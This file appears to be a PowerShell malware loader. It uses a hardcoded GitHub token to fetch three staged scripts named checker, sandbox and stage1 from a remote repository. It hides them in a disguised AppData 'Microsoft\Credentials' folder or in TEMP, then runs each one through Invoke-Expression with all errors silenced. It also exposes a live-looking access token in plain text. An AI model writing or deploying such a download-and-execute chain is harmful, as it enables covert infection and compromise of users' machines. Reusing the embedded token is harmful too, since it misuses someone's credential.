# launcher.ps1 - Chains checker â†’ sandbox â†’ stage1

$ErrorActionPreference = 'SilentlyContinue'
$appData = [System.IO.Path]::GetFolderPath('ApplicationData')
$basePath = "$appData\Microsoft\Credentials"
$githubToken = "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"

# === Fetch scripts from GitHub via API ===
$scripts = @("checker.ps1", "sandbox.ps1", "stage1.ps1")

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $headers = @{
        "Authorization" = "token $githubToken"
        "Accept" = "application/vnd.github.v3+json"
    }

    foreach ($script in $scripts) {
        $path = "$basePath\$script"
        
        try {
            $fileInfo = Invoke-RestMethod -Uri "https://api.github.com/repos/slynet999-coder/Yambo/contents/$script" -Headers $headers
            $content = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($fileInfo.content))
            [System.IO.File]::WriteAllText($path, $content, [System.Text.Encoding]::UTF8)
        } catch {
            $path = "$env:TEMP\$script"
            $fileInfo = Invoke-RestMethod -Uri "https://api.github.com/repos/slynet999-coder/Yambo/contents/$script" -Headers $headers
            $content = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($fileInfo.content))
            [System.IO.File]::WriteAllText($path, $content, [System.Text.Encoding]::UTF8)
        }
    }
} catch {}

# === Execute chain ===
foreach ($script in $scripts) {
    $path = "$basePath\$script"
    if (-not (Test-Path $path)) { $path = "$env:TEMP\$script" }
    
    if (Test-Path $path) {
        try {
            $content = [System.IO.File]::ReadAllText($path, [System.Text.Encoding]::UTF8)
            Invoke-Expression $content
        } catch {}
    }
}
